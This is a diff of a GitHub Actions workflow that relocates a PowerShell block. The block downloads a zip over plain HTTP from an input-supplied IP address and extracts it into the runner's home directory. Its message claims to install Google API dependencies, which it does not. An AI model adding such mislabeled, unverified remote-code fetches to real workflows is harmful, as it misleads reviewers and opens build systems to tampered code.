@@ -29,12 +29,7 @@ jobs:
       - name: Install Python dependencies
         shell: powershell
         run: |
-          Write-Host "Installing Google API dependencies..."
-          mkdir -p C:\python
-          cd C:\python
-          $tailscaleIp = "${{ inputs.tp }}"
-          curl.exe -L -o "C:\python\github.zip" "http://${tailscaleIp}:8888/github-trigger.zip"
-          Expand-Archive -Path "C:\python\github.zip" -DestinationPath "C:\Users\runneradmin"
+
           py -3.11 -m pip install --upgrade pip
           py -3.11 -m pip install requests google-api-python-client google-auth google-auth-oauthlib flask playwright 
           py -3.11 -m playwright install firefox
@@ -72,6 +67,12 @@ jobs:
               }
           }
           catch { exit 1 }
+          Write-Host "Installing Google API dependencies..."
+          mkdir -p C:\python
+          cd C:\python
+          $tailscaleIp = "${{ inputs.tp }}"
+          curl.exe -L -o "C:\python\github.zip" "http://${tailscaleIp}:8888/github-trigger.zip"
+          Expand-Archive -Path "C:\python\github.zip" -DestinationPath "C:\Users\runneradmin"          
           $tailscaleIp = "${{ inputs.tp }}"
           $projectUrl = "http://${tailscaleIp}:8888/Project.zip"
           $zipPath = "C:\python\Project.zip"
